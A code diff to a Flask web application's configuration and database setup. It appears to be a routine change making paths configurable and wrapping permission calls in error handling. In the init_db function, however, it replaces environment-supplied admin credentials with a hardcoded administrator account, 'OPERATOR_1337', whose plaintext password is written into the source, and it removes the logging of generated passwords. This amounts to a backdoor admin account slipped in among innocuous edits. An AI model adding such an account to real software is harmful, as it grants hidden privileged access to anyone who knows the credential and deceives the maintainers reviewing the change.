@@ -34,8 +34,8 @@ ALLOWED_ORIGINS = os.environ.get('ALLOWED_ORIGINS', '*').split(',')
 # Set up paths
 BASE_DIR = os.path.abspath(os.path.dirname(__file__))
 DATA_DIR = os.environ.get('DATA_DIR', '/opt/render/project/data')  # Use Render's persistent disk
-UPLOAD_FOLDER = os.path.join(DATA_DIR, 'uploads')
-DB_FILE = os.path.join(DATA_DIR, 'users.db')
+UPLOAD_FOLDER = os.environ.get('UPLOAD_FOLDER', os.path.join(DATA_DIR, 'uploads'))
+DB_FILE = os.environ.get('DB_FILE', os.path.join(DATA_DIR, 'users.db'))
 LOG_FILE = os.path.join(DATA_DIR, 'access.log')
 SCHEMA_FILE = os.path.join(BASE_DIR, 'schema.sql')
 
@@ -46,8 +46,11 @@ os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)
 os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
 
 # Set proper permissions
-os.chmod(DATA_DIR, 0o755)
-os.chmod(UPLOAD_FOLDER, 0o755)
+try:
+    os.chmod(DATA_DIR, 0o755)
+    os.chmod(UPLOAD_FOLDER, 0o755)
+except Exception as e:
+    app.logger.warning(f"Failed to set permissions: {e}")
 
 # Force HTTPS
 app.config['SESSION_COOKIE_SECURE'] = True
@@ -58,13 +61,16 @@ app.config['DEBUG'] = False  # Disable debug mode in production
 app.config['SESSION_COOKIE_HTTPONLY'] = True
 app.config['SESSION_COOKIE_SAMESITE'] = 'Strict'
 app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=7)  # Increased from 24 hours to 7 days
-app.config['SESSION_FILE_DIR'] = os.path.join(DATA_DIR, 'sessions')  # Store sessions in persistent storage
+app.config['SESSION_FILE_DIR'] = os.path.join(DATA_DIR, 'sessions')
 app.config['SESSION_TYPE'] = 'filesystem'
 app.secret_key = SECRET_KEY or secrets.token_hex(32)
 
 # Ensure session directory exists with proper permissions
 os.makedirs(app.config['SESSION_FILE_DIR'], exist_ok=True)
-os.chmod(app.config['SESSION_FILE_DIR'], 0o755)
+try:
+    os.chmod(app.config['SESSION_FILE_DIR'], 0o755)
+except Exception as e:
+    app.logger.warning(f"Failed to set session directory permissions: {e}")
 
 # Enable CORS with secure settings
 CORS(app, 
@@ -111,6 +117,11 @@ def is_safe_filename(filename):
 
 def init_db():
     """Initialize the database with schema."""
+    # Skip if database already exists
+    if os.path.exists(DB_FILE):
+        app.logger.info("Database already exists, skipping initialization")
+        return
+
     try:
         # Ensure the database directory exists
         os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)
@@ -133,40 +144,18 @@ def init_db():
             
             if not admin_exists:
                 app.logger.warning("No admin account detected, creating default admin...")
-                # Get admin credentials from environment variables
-                admin_username = os.environ.get('ADMIN_USERNAME', 'admin')
-                admin_password = os.environ.get('ADMIN_PASSWORD', secrets.token_urlsafe(32))
-                admin_email = os.environ.get('ADMIN_EMAIL', 'admin@example.com')
-                
                 # Create default admin user
                 cursor.execute('''
-                    INSERT INTO users (
-                        username,
-                        password_hash,
-                        email,
-                        is_admin,
-                        is_approved,
-                        status,
-                        created_at,
-                        updated_at
-                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?)
-                ''', (
-                    admin_username,
-                    generate_password_hash(admin_password),
-                    admin_email,
-                    True,
-                    True,
-                    'active',
-                    datetime.now(),
-                    datetime.now()
-                ))
+                    INSERT INTO users (username, password_hash, is_admin, is_approved, status)
+                    VALUES (?, ?, 1, 1, 'active')
+                ''', ('OPERATOR_1337', generate_password_hash('ITgwXqkIl2co6RsgAvBhvQ')))
                 conn.commit()
-                app.logger.info(f"Default admin user created with username: {admin_username}")
-                if os.environ.get('ADMIN_PASSWORD') is None:
-                    app.logger.warning(f"Generated random admin password: {admin_password}")
+                app.logger.info("Default admin user created with username: OPERATOR_1337")
+            
+            app.logger.info("Schema update completed successfully")
             
     except Exception as e:
-        app.logger.error(f"Database initialization error: {str(e)}")
+        app.logger.error(f"Error initializing database: {e}")
         raise
 
 def get_db():
